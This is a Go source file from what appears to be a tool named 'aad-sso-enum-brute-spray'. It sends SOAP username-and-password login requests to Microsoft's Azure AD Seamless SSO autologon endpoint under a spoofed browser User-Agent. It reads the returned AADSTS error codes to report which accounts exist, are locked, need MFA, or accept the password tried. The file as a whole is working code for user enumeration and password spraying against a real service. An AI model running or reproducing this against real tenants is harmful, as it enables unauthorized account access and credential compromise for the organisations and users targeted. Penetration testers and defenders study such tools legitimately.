package clients

import (
	"aad-sso-enum-brute-spray/pkg/dto"
	"encoding/xml"
	"fmt"
	"github.com/google/uuid"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"
)

type AzureClient struct {}

func NewAzureClient() *AzureClient {
	return &AzureClient{}
}

func (azc *AzureClient) GetAzureActiveDirectory(domain string, user string, password string, wg *sync.WaitGroup, writer io.Writer) {
	requestid := uuid.New()
	MessageID := uuid.New()
	userID := uuid.New()
	now := time.Now()
	creates := now.Format(time.RFC3339Nano)
	expires := now.Add(time.Minute * 10).Format(time.RFC3339Nano)
	url := "https://autologon.microsoftazuread-sso.com/" + domain + "/winauth/trust/2005/usernamemixed?client-request-id=" + requestid.String()
	body := strings.NewReader(`<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
  <s:Header>
      <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
      <wsa:To s:mustUnderstand='1'>` + url + `</wsa:To>
      <wsa:MessageID>urn:uuid:` + MessageID.String() + `</wsa:MessageID>
      <wsse:Security s:mustUnderstand="1">
          <wsu:Timestamp wsu:Id="_0">
              <wsu:Created>` + creates + `</wsu:Created>
              <wsu:Expires>` + expires + `</wsu:Expires>
          </wsu:Timestamp>
          <wsse:UsernameToken wsu:Id="uuid-` + userID.String() + `">
              <wsse:Username>` + user + `</wsse:Username>
              <wsse:Password>` + password + `</wsse:Password>
          </wsse:UsernameToken>
      </wsse:Security>
  </s:Header>
  <s:Body>
      <wst:RequestSecurityToken Id='RST0'>
          <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
              <wsp:AppliesTo>
                  <wsa:EndpointReference>
                      <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                  </wsa:EndpointReference>
              </wsp:AppliesTo>
              <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
      </wst:RequestSecurityToken>
  </s:Body>
</s:Envelope>
`)
	// create a request object
	req, _ := http.NewRequest(
		"POST",
		url,
		body,
	)
	// add a request header
	req.Header.Add("Content-Type", "application/json; charset=UTF-8")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/94.0.992.50")
	// send an HTTP using `req` object
	res, err := http.DefaultClient.Do(req)
	// check for response error
	if err != nil {
		log.Fatal("Error:", err)
	}
	// read response body
	data, _ := ioutil.ReadAll(res.Body)
	// close response body
	res.Body.Close()
	// print response status and body
	if res.StatusCode != 200 {
		errorCodeMessage := getErrorCodeMessage(getErrorCode(string(data)))
		errorMessage := fmt.Sprintf("%s:%s -> %s", user, password, errorCodeMessage)
		fmt.Fprintln(writer, errorMessage)
	} else {
		fmt.Fprintln(writer, fmt.Sprintf("%s:%s -> Correct credentials", user, password))
	}
	defer wg.Done()
}

func getErrorCode(xmlcode string) string {
	// Extract error code from xml response
	azureErrorResponseDto := dto.AzureErrorResponseDto{}
	_ = xml.Unmarshal([]byte(xmlcode), &azureErrorResponseDto)
	errorCode := strings.Split(azureErrorResponseDto.Error, ":")[0]
	return errorCode
}

func getErrorCodeMessage(errorCode string) string {
	var errorCodesMessage = map[string]string{
		"AADSTS81016": "Invalid STS request",
		"AADSTS50053": "Locked",
		"AADSTS50126": "Bad Password",
		"AADSTS50056": "Exists w/no password",
		"AADSTS50014": "Exists, but max passthru auth time exceeded",
		"AADSTS50076": "Need mfa",
		"AADSTS700016": "No app",
		"AADSTS50034": "No user",
	}
	if errorCodeMessage := errorCodesMessage[errorCode]; errorCodeMessage != "" {
		return errorCodeMessage
	}
	return "No error message for ErrorCode: " + errorCode
}